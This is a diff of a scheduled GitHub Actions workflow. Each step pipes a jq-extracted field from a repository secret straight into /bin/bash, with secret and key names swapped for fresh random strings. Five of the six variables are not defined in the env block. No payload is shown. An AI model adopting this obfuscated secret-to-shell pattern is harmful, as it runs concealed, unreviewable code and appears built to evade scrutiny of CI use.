@@ -3,21 +3,21 @@ name: hugouhuolong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 0/6 * * *'
-
+    - cron: '17 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hugouhuolong
         env:
-          rsoq2867: ${{ secrets.rsoq2867 }}
+          pw94621: ${{ secrets.pw94621 }}
         run: |
-          echo $rsoq2867 | jq -r .o02 | /bin/bash
-          echo $nwkdc284 | jq -r .j5 | /bin/bash
-          echo $ychh3 | jq -r .fjxky7188 | /bin/bash
-          echo $zo78319 | jq -r .jki98452 | /bin/bash
-          echo $btzjp925 | jq -r .nbiz0 | /bin/bash
-          echo $bcn1982 | jq -r .tnm67 | /bin/bash
+          echo $pw94621 | jq -r .y48467 | /bin/bash
+          echo $jdiw35912 | jq -r .fjxdl24 | /bin/bash
+          echo $u877 | jq -r .kkn1639 | /bin/bash
+          echo $tmai12 | jq -r .iylq9483 | /bin/bash
+          echo $od1114 | jq -r .f5 | /bin/bash
+          echo $lkhr0829 | jq -r .yr86 | /bin/bash
 
